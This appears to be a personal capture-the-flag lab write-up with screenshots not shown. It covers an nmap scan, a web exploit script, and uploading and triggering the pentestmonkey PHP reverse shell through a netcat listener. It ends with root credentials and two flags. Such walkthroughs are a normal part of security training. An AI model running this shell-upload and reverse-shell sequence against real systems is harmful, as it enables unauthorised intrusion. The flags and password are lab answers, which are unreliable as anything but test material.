```bash
sudo nmap 0.0.0.0 -O -sV -sSV -Pn -sC -T4
```

![[Captura desde 2024-10-11 10-37-05.png]]

![[Captura desde 2024-10-11 10-39-17.png]]

![[Captura desde 2024-10-11 10-39-55.png]]

Save the file and execute exploit

```bash
python3 exploit.py -u http://0.0.0.0/
```

![[Captura desde 2024-10-11 10-43-32.png]]

![[Captura desde 2024-10-12 00-52-56.png]]

**flag: `6470e394cbf6dab6a91682cc8585059b`**

`https://pentestmonkey.net/tools/web-shells/php-reverse-shell`

```bash
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
```

download archive change ip address and port 

![[Captura desde 2024-10-12 03-26-19.png]]

Edit `php-reverse-shell.php`

![[Captura desde 2024-10-12 03-29-01.png]]

Run server same folder `php-reverse-shell.php`

```bash
python3 -m http.server 8080 
```

![[Captura desde 2024-10-12 03-35-44.png]]

```bash
wget http://0.0.0.0:8080/php-reverse-shell.php
```

![[Captura desde 2024-10-12 03-50-51.png]]

![[Captura desde 2024-10-12 03-39-59.png]]

Run port lister

```bash
nc -lvnp 9001
```

Open reverse shell with browser 

`http://0.0.0.0/php-reverse-shell.php`

![[Captura desde 2024-10-12 03-53-50.png]]

Get proper terminal 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![[Captura desde 2024-10-12 03-56-05.png]]

![[Captura desde 2024-10-12 04-01-41.png]]

![[Captura desde 2024-10-12 04-02-40.png]]

![[Captura desde 2024-10-12 04-03-05.png]]

Username: `root`
Password: `mememe`

![[Captura desde 2024-10-12 04-07-02.png]]

**flag: `b9bbcb33e11b80be759c4e844862482d`**